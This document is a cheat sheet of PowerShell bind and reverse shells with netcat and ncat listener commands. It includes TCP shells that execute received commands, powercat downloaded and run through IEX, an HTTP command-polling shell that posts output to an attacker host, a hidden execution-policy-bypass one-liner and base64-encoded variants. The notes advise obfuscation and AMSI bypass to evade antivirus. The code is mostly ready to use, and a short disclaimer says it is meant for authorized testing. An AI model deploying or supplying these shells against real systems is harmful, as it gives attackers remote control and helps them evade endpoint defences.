Here's a list of common PowerShell bind and reverse shells that can be used in different scenarios. These scripts will allow you to either connect to a remote system (**reverse shell**) or listen for incoming connections (**bind shell**). Each example is designed to work in different situations, such as limited access environments or leveraging native PowerShell capabilities.

# Bind Shells

## PowerShell Bind Shell
This bind shell listens on the target system for incoming connections.

### Parameters
- **Target's Port:** `<target_port>`

```powershell
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, <target_port>);
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object byte[] 1024;
$encoding = [System.Text.Encoding]::ASCII;

while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $cmd = $encoding.GetString($buffer, 0, $bytesRead);
    $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String);
    $writer.WriteLine($output);
    $writer.Flush();
}
```

### Usage
To connect to the bind shell from the attacker’s machine, use:
```bash
nc <target_ip> <target_port>
```

## PowerShell Bind Shell Using Powercat

```powershell
## Install powercat (if not installed already)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

## Start bind shell
powercat -l -p <target_port> -e cmd.exe
```

### Usage
To connect to the bind shell from the attacker’s machine:
```bash
nc <target_ip> <target_port>
```

# Reverse Shells

## Basic PowerShell Reverse Shell
This reverse shell connects back to an attacker's machine.

### Parameters
- **Attacker's IP:** `<attack_ip>`
- **Attacker's Port:** `<attack_port>`

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<attack_ip>', <attack_port>);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object byte[] 1024;
$encoding = [System.Text.Encoding]::ASCII;

while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $cmd = $encoding.GetString($buffer, 0, $bytesRead);
    $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String);
    $writer.WriteLine($output);
    $writer.Flush();
}
```

### Usage
On the attacker's machine, you can use `nc` (Netcat) to listen for a connection:
```bash
nc -lvp <attack_port>
```

## Encrypted PowerShell Reverse Shell (Base64 Encoded)
This method avoids detection by encoding the shell commands.

### Parameters
- **Attacker's IP:** `<attack_ip>`
- **Attacker's Port:** `<attack_port>`

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<attack_ip>', <attack_port>);
$stream = $client.GetStream();
$buffer = New-Object byte[] 1024;
$encoding = [System.Text.Encoding]::ASCII;

while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $cmd = $encoding.GetString($buffer, 0, $bytesRead);
    $output = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((Invoke-Expression $cmd 2>&1 | Out-String)));
    $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output + "`n");
    $stream.Write($outputBytes, 0, $outputBytes.Length);
}
```

### Usage
On the attacker’s machine:
```bash
nc -lvp <attack_port>
```
Then use a base64 decoder to decode the output.

## PowerShell Reverse Shell Using Powercat
**Powercat** is a PowerShell reimplementation of `netcat` and provides easy reverse and bind shell capabilities.

### Parameters
- **Attacker's IP:** `<attack_ip>`
- **Attacker's Port:** `<attack_port>`

```powershell
## Install powercat (if not installed already)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

## Start reverse shell
powercat -c <attack_ip> -p <attack_port> -e cmd.exe
```

### Usage
On the attacker's machine:
```bash
nc -lvp <attack_port>
```

## PowerShell Reverse Shell with Ncat (Nmap)
Using **ncat** from the Nmap package to catch a reverse shell.

### Parameters
- **Attacker's IP:** `<attack_ip>`
- **Attacker's Port:** `<attack_port>`

```powershell
$process = Start-Process "ncat" -ArgumentList "-e cmd.exe <attack_ip> <attack_port>" -NoNewWindow -PassThru;
```

### Usage
On the attacker's machine, use **ncat** to listen:
```bash
ncat -lvp <attack_port>
```

## PowerShell Web Reverse Shell
This reverse shell sends commands via HTTP POST requests to a web server (attacker).

### Parameters
- **Attacker's IP:** `<attack_ip>`

```powershell
while ($true) {
    $command = Invoke-RestMethod -Uri http://<attack_ip>/cmd;
    $output = Invoke-Expression $command 2>&1 | Out-String;
    Invoke-RestMethod -Uri http://<attack_ip>/output -Method POST -Body $output;
    Start-Sleep -Seconds 5;
}
```

### Usage
Set up a web server on the attacker's machine and serve commands via the `/cmd` endpoint. Collect the output from the `/output` endpoint.

## One-Liner PowerShell Reverse Shell

If you need to execute a reverse shell in a single line:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<attack_ip>',<attack_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

## Encoded PowerShell Reverse Shell One-Liner
This version uses encoded commands to avoid detection or bypass restrictions.

### Encode the script
```bash
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Your_PowerShell_Script_Here'))
```

### Example

```bash
powershell -EncodedCommand <encoded_command>
```

Replace `<encoded_command>` with the base64-encoded PowerShell command from the script you want to execute.




## Notes
1. Replace the placeholders `<attack_ip>`, `<attack_port>`, and `<target_port>` with actual values for your scenario.
2. These shells are typically detected by antivirus or endpoint protection systems. You may need to obfuscate the scripts or employ AMSI bypass techniques to avoid detection.
3. Always test these commands in a safe environment, and only use them for legal penetration testing or authorized red team activities.